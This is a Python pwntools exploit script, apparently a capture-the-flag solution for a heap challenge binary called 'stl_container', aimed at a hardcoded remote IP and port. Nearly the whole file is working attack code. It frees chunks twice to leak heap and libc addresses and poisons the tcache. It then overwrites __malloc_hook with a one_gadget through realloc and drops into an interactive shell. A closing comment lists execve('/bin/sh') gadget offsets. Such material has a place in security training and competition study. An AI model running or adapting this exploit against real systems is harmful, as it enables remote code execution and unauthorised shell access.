#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'stl_container'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "134.175.239.26"
remotePort = 8848

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(type, data):
	sla('>> ', str(type))
	sla('>> ', str(1))
	sa('data:', data)

def rm(type, idx):
	sla('>> ', str(type))
	sla('>> ', str(2))
	sla('index?', str(idx))

def dp(type, idx):
	sla('>> ', str(type))
	sla('>> ', str(3))
	sla('index?', str(idx))

def q():
	sla(':', str(5))	

'''
1. list
2. vector
3. queue
4. stack
'''
#--------------------------Exploit--------------------------
def exploit():
	ad(1, 'A' * 0x98)
	ad(1, 'B' * 0x98)

	rm(1, 0)
	rm(1, 0)

	ad(1, '\x10')
	dp(1, 0)
	ru('data: ')
	heap = u64(ru('\x0a').ljust(0x8, '\x00')) - (0x55e349825510 - 0x55e349813000)
	li('heap ' + hex(heap))
	

	ad(1, '0' * 0x98)
	ad(2, '1' * 0x98)
	ad(2, '2' * 0x98)

	ad(3, '3' * 0x98)

	rm(1, 0)
	rm(1, 0)

	rm(2, 0)
	rm(2, 0)

	# attack to tecach
	ad(1, p64(heap + 0x10)) #0x55c475e62730

	p = p64(0x0000000000000002)
	p += p64(0x000000000000007)
	p += p64(0) * 6
	p += p64(heap + 0x470)
	p += p64(0)
	p += p64(0) * 6
	p += p64(heap + (0x5560f3cd94a0 - 0x5560f3cc7000) + 0x10)

	p += p64(0) * 3

	ad(1, p)
	dp(1, 0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x3ebc40 - 96
	li('libc_address' + hex(lib.address))

	#p = p64(0x2)
	#p += p64(7)
	#p + p64(0) * 10

	ad(2, 'A')
	ad(2, 'A')
	#ad(3, 'A')

	rm(2, 0)
	rm(2, 0)

	p = p64(lib.sym['__malloc_hook'] - 0x8)
	ad(4, p)

	gadget = [0x4f2c5, 0x4f322, 0x10a38c]
	one_gadget = lib.address + gadget[1]
	p = p64(one_gadget)
	p += p64(lib.sym['realloc'])
	p += p64(0) * 10
	ad(4, p)

	ru('>> ')
	sl('2')

	sl('1')

#	db()








def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
